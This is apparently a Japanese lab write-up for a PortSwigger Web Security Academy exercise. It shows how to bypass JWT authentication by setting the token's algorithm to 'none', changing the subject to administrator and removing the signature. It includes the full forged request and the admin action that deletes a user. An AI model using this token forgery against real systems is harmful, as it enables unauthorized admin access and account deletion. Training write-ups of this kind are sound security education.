# 欠陥のある署名検証による JWT 認証バイパス

次のラボを実施します  
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification  
このラボでは、セッションの処理に JWT ベースのメカニズムを使用します。サーバーは、署名されていない JWT を受け入れるように安全に構成されていません。

- 1. BurpSuite を起動して、proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. GET /my-account?id=wiener リクエストを send to repeater します
- 5. リクエストを GET /admin HTTP/2 に書き換えて送信します。
     権限不足のレスポンスが返ってきます。

```
HTTP/2 401 Unauthorized
```

- 6. リクエストの JWT の sub を administrator にします。alg を none に設定します(署名アルゴリズム)。JWT をコピーしてリクエストを差し替えます
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/075a8a70-80eb-4300-840a-ba7f1eb5796f)

- 7. JWT の 2 番目の.以降は署名なので削除して、送信します

```
GET /admin HTTP/2
Host: 0a4e0088030b8b5480fe7b77000600e4.web-security-academy.net
Cookie: session=eyJraWQiOiIwMzA1MjY1MS0wODEwLTRlYWMtOWFhZi1hMTQxZDExMGI4ZTYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTIzNTI0MTJ9.
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Referer: https://0a4e0088030b8b5480fe7b77000600e4.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

権限ありで管理者ページにアクセス出来ました

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3165
・・・
<a href="/admin/delete?username=carlos">Delete</a>
```

- 8. エンドポイントを/admin/delete?username=carlos に変更してリクエストを送ると一般ユーザーが削除されます

```
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
